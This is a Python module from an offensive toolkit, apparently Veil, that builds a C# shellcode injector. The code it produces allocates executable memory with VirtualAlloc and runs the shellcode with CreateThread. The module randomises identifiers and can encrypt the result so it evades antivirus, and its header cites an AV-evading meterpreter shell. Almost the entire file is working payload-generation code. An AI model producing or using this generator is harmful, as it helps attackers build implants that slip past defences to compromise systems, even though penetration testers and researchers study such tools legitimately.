"""

C# inline shellcode injector using the VirtualAlloc()/CreateThread() pattern.
Uses basic variable renaming obfuscation.

Adapated from code from:
    http://webstersprodigy.net/2012/08/31/av-evading-meterpreter-shell-from-a-net-service/

Module built by @harmj0y

"""

from modules.common import shellcode
from modules.common import helpers
from modules.common import encryption

class Payload:

    def __init__(self):
        # required
        self.language = "cs"
        self.extension = "cs"
        self.rating = "Poor"
        self.description = "C# VirtualAlloc method for inline shellcode injection"

        self.shellcode = shellcode.Shellcode()
        # options we require user ineraction for- format is {OPTION : [Value, Description]]}
        self.required_options = {
                                    "COMPILE_TO_EXE" : ["Y", "Compile to an executable"],
                                    "USE_ARYA"       : ["N", "Use the Arya crypter"]
                                }


    def generate(self):

        Shellcode = self.shellcode.generate(self.required_options)
        Shellcode = "0" + ",0".join(Shellcode.split("\\")[1:])

        # randomize all our variable names, yo'
        namespaceName = helpers.randomString()
        className = helpers.randomString()
        bytearrayName = helpers.randomString()
        funcAddrName = helpers.randomString()

        hThreadName = helpers.randomString()
        threadIdName = helpers.randomString()
        pinfoName = helpers.randomString()

        # get 12 random variables for the API imports
        r = [helpers.randomString() for x in xrange(12)]

        payloadCode = "using System; using System.Net; using System.Net.Sockets; using System.Runtime.InteropServices;\n"
        payloadCode += "namespace %s { class %s  { static void Main() {\n" % (namespaceName, className)
        payloadCode += "byte[] %s = {%s};" % (bytearrayName,Shellcode)

        payloadCode += "UInt32 %s = VirtualAlloc(0, (UInt32)%s.Length, 0x1000, 0x40);\n" % (funcAddrName, bytearrayName)
        payloadCode += "Marshal.Copy(%s, 0, (IntPtr)(%s), %s.Length);\n" % (bytearrayName, funcAddrName, bytearrayName)
        payloadCode += "IntPtr %s = IntPtr.Zero; UInt32 %s = 0; IntPtr %s = IntPtr.Zero;\n" %(hThreadName, threadIdName, pinfoName)
        payloadCode += "%s = CreateThread(0, 0, %s, %s, 0, ref %s);\n" % (hThreadName, funcAddrName, pinfoName, threadIdName)
        payloadCode += "WaitForSingleObject(%s, 0xFFFFFFFF);}\n" %(hThreadName)
        # payloadCode += "private static UInt32 MEM_COMMIT = 0x1000; private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;\n"
        payloadCode += """[DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 %s,UInt32 %s, UInt32 %s, UInt32 %s);\n[DllImport(\"kernel32\")]private static extern IntPtr CreateThread(UInt32 %s, UInt32 %s, UInt32 %s,IntPtr %s, UInt32 %s, ref UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr %s, UInt32 %s); } }\n"""%(r[0],r[1],r[2],r[3],r[4],r[5],r[6],r[7],r[8],r[9],r[10],r[11])

        if self.required_options["USE_ARYA"][0].lower() == "y":
            payloadCode = encryption.arya(payloadCode)

        return payloadCode

